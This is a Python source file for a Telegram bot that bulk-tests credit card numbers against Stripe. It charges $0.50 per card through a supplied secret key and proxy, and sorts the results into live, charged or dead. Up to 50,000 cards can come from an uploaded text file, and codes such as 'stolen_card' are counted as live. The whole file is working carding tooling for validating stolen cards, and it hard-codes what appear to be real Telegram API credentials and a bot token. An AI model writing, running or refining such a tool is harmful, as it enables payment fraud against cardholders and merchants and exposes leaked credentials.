"""
Standalone SK Stripe Card Checker Bot
Commands:
  /start              — welcome
  /setsk <key>        — set your Stripe secret key (owner only)
  /setproxy <url>     — set proxy e.g. http://user:pass@host:port (owner only)
  /delproxy           — remove proxy
  /chk <card>         — check single card: 4111111111111111|12|2028|123
  /chktxt             — bulk check from .txt file (reply to file)
  /info               — show current SK, proxy, and settings
"""
import asyncio, aiohttp, json, os, re, tempfile
from telethon import TelegramClient, events

# ── CONFIG ────────────────────────────────────────────────────────────────────
API_ID    = int(os.environ.get('TG_API_ID',   '32253547'))
API_HASH  = os.environ.get('TG_API_HASH',     '868242502bea6a1e41b2ce46001d0580')
BOT_TOKEN = os.environ.get('SK_BOT_TOKEN',    '8748861237:AAHmW5CGflPCj1NCJQkN3W4gEIVS4yGDvgU')
OWNER_ID  = int(os.environ.get('TG_OWNER_ID', '5895386985'))
CURRENCY  = "usd"
AMOUNT    = 50   # cents — $0.50
# ─────────────────────────────────────────────────────────────────────────────

_SK        = ""     # set via /setsk at runtime
_PROXY     = ""     # set via /setproxy at runtime (e.g. http://user:pass@host:port)
_txt_running: set = set()   # user IDs with active /chktxt scan
MAX_CARDS  = 50000
_SEM       = asyncio.Semaphore(5)   # max 5 concurrent checks

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

_LIVE_CODES = {
    "insufficient_funds", "do_not_honor", "card_velocity_exceeded",
    "not_permitted", "restricted_card", "security_violation",
    "transaction_not_permitted", "incorrect_cvc", "incorrect_zip",
    "card_not_supported", "withdrawal_count_limit_exceeded",
    "currency_not_supported", "duplicate_transaction",
    "pickup_card", "lost_card", "stolen_card",
}

_DEAD_CODES = {
    "invalid_number", "invalid_expiry_month", "invalid_expiry_year",
    "invalid_cvc", "expired_card", "card_declined", "incorrect_number",
}


def classify(resp: dict):
    if resp.get("status") in ("succeeded", "requires_capture"):
        return "CHARGED ✅", "Payment succeeded"

    err = resp.get("last_payment_error") or resp.get("error") or {}
    code    = err.get("decline_code") or err.get("code") or ""
    message = err.get("message", "Unknown error")

    if resp.get("status") == "requires_action" or "authentication" in message.lower():
        return "LIVE 🔐 (3DS)", message

    if code in _LIVE_CODES:
        return "LIVE ✅", f"{code}"

    if code in _DEAD_CODES:
        return "DEAD ❌", f"{code}"

    return f"UNKNOWN ⚠️", f"{code} — {message}"


def _parse_cards(text: str) -> list:
    cards = []
    for line in text.splitlines():
        line = line.strip()
        # support | and : separators, skip junk lines
        line = re.sub(r'[:\s]+', '|', line)
        parts = line.split("|")
        if len(parts) >= 4:
            cards.append("|".join(parts[:4]))
    return cards


async def check_card_api(card_str: str):
    global _SK, _PROXY
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return None, "Bad format. Use: number|MM|YYYY|CVV"

    number, month, year, cvv = parts
    headers = {
        "Authorization": f"Bearer {_SK}",
        "Content-Type":  "application/x-www-form-urlencoded",
        "User-Agent":    UA,
    }
    proxy = _PROXY or None

    async with aiohttp.ClientSession() as s:
        # Single step — inline payment_method_data in PaymentIntent
        pi_data = {
            "amount":                                str(AMOUNT),
            "currency":                              CURRENCY,
            "confirm":                               "true",
            "capture_method":                        "automatic",
            "payment_method_data[type]":             "card",
            "payment_method_data[card][number]":     number,
            "payment_method_data[card][exp_month]":  month,
            "payment_method_data[card][exp_year]":   year,
            "payment_method_data[card][cvc]":        cvv,
            "payment_method_data[billing_details][name]": "John Doe",
        }
        async with s.post("https://api.stripe.com/v1/payment_intents",
                          headers=headers, data=pi_data, proxy=proxy) as r:
            pi_resp = await r.json()

    return classify(pi_resp)


# ── BOT HANDLERS ─────────────────────────────────────────────────────────────

bot = TelegramClient('sk_checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)


@bot.on(events.NewMessage(pattern=r'^/start'))
async def on_start(e):
    await e.respond(
        "**SK Stripe Card Checker**\n\n"
        "Commands:\n"
        "`/setsk sk_live_xxx` — set secret key (owner only)\n"
        "`/setproxy http://user:pass@host:port` — set proxy\n"
        "`/delproxy` — remove proxy\n"
        "`/chk 4111111111111111|12|2028|123` — check single card\n"
        "`/chktxt` — bulk check (send .txt file then reply with /chktxt)\n"
        "`/info` — show current settings"
    )


async def _verify_sk(key: str) -> tuple[bool, str]:
    headers = {
        "Authorization": f"Bearer {key}",
        "User-Agent": UA,
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://api.stripe.com/v1/balance",
                             headers=headers,
                             proxy=_PROXY or None,
                             timeout=aiohttp.ClientTimeout(total=10)) as r:
                data = await r.json()
        if r.status == 200:
            # show available balance if present
            avail = data.get("available", [])
            bal = f"{avail[0]['amount']/100:.2f} {avail[0]['currency'].upper()}" if avail else "N/A"
            return True, f"Balance: {bal}"
        elif r.status == 401:
            return False, data.get("error", {}).get("message", "Invalid API key")
        else:
            return False, f"HTTP {r.status}"
    except Exception as ex:
        return False, str(ex)


@bot.on(events.NewMessage(pattern=r'^/setsk\s+(.+)'))
async def on_setsk(e):
    global _SK
    if e.sender_id != OWNER_ID:
        await e.respond("❌ Owner only.")
        return
    key = e.pattern_match.group(1).strip()
    if not (key.startswith("sk_live_") or key.startswith("sk_test_")):
        await e.respond("❌ Invalid key. Must start with `sk_live_` or `sk_test_`")
        return

    checking = await e.respond("⏳ Verifying SK...")
    is_live, detail = await _verify_sk(key)

    if is_live:
        _SK = key
        tag = "🟢 LIVE" if key.startswith("sk_live_") else "🟡 TEST"
        await checking.edit(
            f"{tag} **SK Set**\n\n"
            f"Key     : `{key[:20]}...`\n"
            f"Status  : ✅ Valid\n"
            f"Detail  : {detail}"
        )
    else:
        await checking.edit(
            f"🔴 **DEAD SK**\n\n"
            f"Key     : `{key[:20]}...`\n"
            f"Status  : ❌ Invalid\n"
            f"Reason  : {detail}"
        )


def _parse_proxy(raw: str) -> str:
    raw = raw.strip()
    # already has scheme — use as-is
    if raw.startswith("http://") or raw.startswith("https://") or raw.startswith("socks5://"):
        return raw
    # host:port:user:pass
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"http://{user}:{passwd}@{host}:{port}"
    # host:port (no auth)
    if len(parts) == 2:
        return f"http://{raw}"
    # user:pass@host:port
    if "@" in raw:
        return f"http://{raw}"
    return ""


@bot.on(events.NewMessage(pattern=r'^/setproxy\s+(.+)'))
async def on_setproxy(e):
    global _PROXY
    if e.sender_id != OWNER_ID:
        await e.respond("❌ Owner only.")
        return
    raw = e.pattern_match.group(1).strip()
    proxy = _parse_proxy(raw)
    if not proxy:
        await e.respond(
            "❌ Could not parse proxy.\nSupported formats:\n"
            "`http://user:pass@host:port`\n"
            "`socks5://user:pass@host:port`\n"
            "`host:port:user:pass`\n"
            "`host:port`"
        )
        return
    _PROXY = proxy
    host = proxy.split("@")[-1] if "@" in proxy else proxy.split("//")[-1]
    await e.respond(f"✅ Proxy set: `{host}`")


@bot.on(events.NewMessage(pattern=r'^/delproxy'))
async def on_delproxy(e):
    global _PROXY
    if e.sender_id != OWNER_ID:
        await e.respond("❌ Owner only.")
        return
    _PROXY = ""
    await e.respond("✅ Proxy removed. Using direct connection.")


@bot.on(events.NewMessage(pattern=r'^/info'))
async def on_info(e):
    if e.sender_id != OWNER_ID:
        await e.respond("❌ Owner only.")
        return
    sk_display    = f"`{_SK[:20]}...`" if _SK else "❌ Not set"
    proxy_display = f"`{_PROXY.split('@')[-1]}`" if _PROXY else "❌ None (direct)"
    await e.respond(
        f"**SK Checker Info**\n\n"
        f"SK       : {sk_display}\n"
        f"Proxy    : {proxy_display}\n"
        f"Currency : {CURRENCY}\n"
        f"Amount   : ${AMOUNT/100:.2f}"
    )


@bot.on(events.NewMessage(pattern=r'^/chk\s+(.+)'))
async def on_chk(e):
    global _SK
    if not _SK:
        await e.respond("❌ No SK set. Owner must run `/setsk sk_live_xxx` first.")
        return

    card = e.pattern_match.group(1).strip()
    msg = await e.respond("⏳ Checking...")

    try:
        status, detail = await check_card_api(card)
    except Exception as ex:
        await msg.edit(f"❌ Error: {ex}")
        return

    parts = card.split("|")
    card_display = "|".join(parts) if len(parts) == 4 else card

    await msg.edit(
        f"**Card:** `{card_display}`\n"
        f"**Status:** {status}\n"
        f"**Detail:** {detail}\n"
        f"**Amount:** ${AMOUNT/100:.2f} {CURRENCY.upper()}"
    )


@bot.on(events.NewMessage(pattern=r'^/chktxt'))
async def on_chktxt(e):
    global _txt_running
    if not _SK:
        await e.respond("❌ No SK set. Owner must run `/setsk sk_live_xxx` first.")
        return

    uid = e.sender_id
    if uid in _txt_running:
        await e.respond("⚠️ You already have a scan running. Wait for it to finish.")
        return

    # get the .txt file — either attached to this message or the replied-to message
    file_msg = e
    if e.reply_to_msg_id:
        file_msg = await e.get_reply_message()

    if not file_msg.document:
        await e.respond("❌ Send a `.txt` file and reply to it with `/chktxt`\n"
                        "Or send `/chktxt` with the file attached.")
        return

    # download file
    tmp = tempfile.mktemp(suffix=".txt")
    await bot.download_media(file_msg, file=tmp)
    try:
        with open(tmp, encoding="utf-8", errors="ignore") as f:
            raw = f.read()
    finally:
        os.remove(tmp)

    cards = _parse_cards(raw)
    if not cards:
        await e.respond("❌ No valid cards found in file.")
        return

    cards = cards[:MAX_CARDS]
    total = len(cards)

    prog_msg = await e.respond(
        f"⏳ Starting scan...\n"
        f"Total cards: **{total}**"
    )

    _txt_running.add(uid)

    hits      = []
    checked   = 0
    live_count = 0
    charged_count = 0

    async def _check_one(card):
        nonlocal checked, live_count, charged_count
        try:
            status, detail = await check_card_api(card)
        except Exception:
            status, detail = "DEAD ❌", "error"
        checked += 1
        if "CHARGED" in status:
            charged_count += 1
            hits.append(f"[CHARGED] {card} | {detail}")
            await bot.send_message(
                e.chat_id,
                f"💳 **CHARGED ✅**\n"
                f"Card   : `{card}`\n"
                f"Detail : {detail}\n"
                f"Amount : ${AMOUNT/100:.2f} {CURRENCY.upper()}"
            )
        elif "LIVE" in status:
            live_count += 1
            hits.append(f"[LIVE] {card} | {detail}")
            await bot.send_message(
                e.chat_id,
                f"💳 **LIVE ✅**\n"
                f"Card   : `{card}`\n"
                f"Detail : {detail}"
            )
        return status, detail

    async def _worker(card):
        async with _SEM:
            return await _check_one(card)

    # progress update task
    async def _update_progress():
        while uid in _txt_running:
            await asyncio.sleep(5)
            try:
                await prog_msg.edit(
                    f"⏳ Scanning...\n"
                    f"Checked : **{checked}** / {total}\n"
                    f"Live    : **{live_count}**\n"
                    f"Charged : **{charged_count}**"
                )
            except Exception:
                pass

    prog_task = asyncio.create_task(_update_progress())

    try:
        await asyncio.gather(*[_worker(c) for c in cards])
    finally:
        _txt_running.discard(uid)
        prog_task.cancel()

    # final summary
    await prog_msg.edit(
        f"✅ **Scan Complete**\n\n"
        f"Total   : {total}\n"
        f"Checked : {checked}\n"
        f"Live    : **{live_count}**\n"
        f"Charged : **{charged_count}**\n"
        f"Dead    : {checked - live_count - charged_count}"
    )

    # send hits file if any
    if hits:
        hits_text = "\n".join(hits)
        tmp_hits = tempfile.mktemp(suffix=".txt")
        with open(tmp_hits, "w") as f:
            f.write(hits_text)
        try:
            await bot.send_file(
                e.chat_id,
                tmp_hits,
                caption=f"🎯 Hits: {len(hits)} | Live: {live_count} | Charged: {charged_count}",
                file_name="sk_hits.txt"
            )
        finally:
            os.remove(tmp_hits)
    else:
        await e.respond("No hits found.")


print("SK Checker Bot running...")
bot.run_until_disconnected()
